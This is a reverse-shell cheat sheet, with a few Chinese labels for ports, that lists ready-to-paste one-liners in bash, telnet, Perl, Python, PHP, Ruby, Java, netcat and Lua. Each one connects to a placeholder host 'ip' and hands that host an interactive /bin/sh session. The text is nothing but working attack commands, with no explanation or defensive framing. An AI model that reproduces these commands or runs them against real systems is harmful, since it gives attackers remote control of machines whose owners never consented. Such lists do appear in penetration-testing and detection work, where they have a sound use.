Telnet: 
telnet ip 1111 | /bin/bash | telnet ip 3333
1111： 端口命令执行			3333： 信息返回

Bash:
bash -i >& /dev/tcp/ip/1234 0>&1

PERL:
perl -e 'use Socket;$i="ip";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Python:
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

PHP:
php -r '$sock=fsockopen("ip",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

Ruby: 
ruby -rsocket -e'f=TCPSocket.open("ip",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

Java: 
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ip/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


nc：
nc -e /bin/sh ip 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip 1234 >/tmp/f
nc ip 1111：|/bin/sh|nc ip 3333
1111： 端口命令执行			3333： 信息返回


lua：
lua -e "require('socket');require('os');t=socket.tcp();t:connect('ip','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"

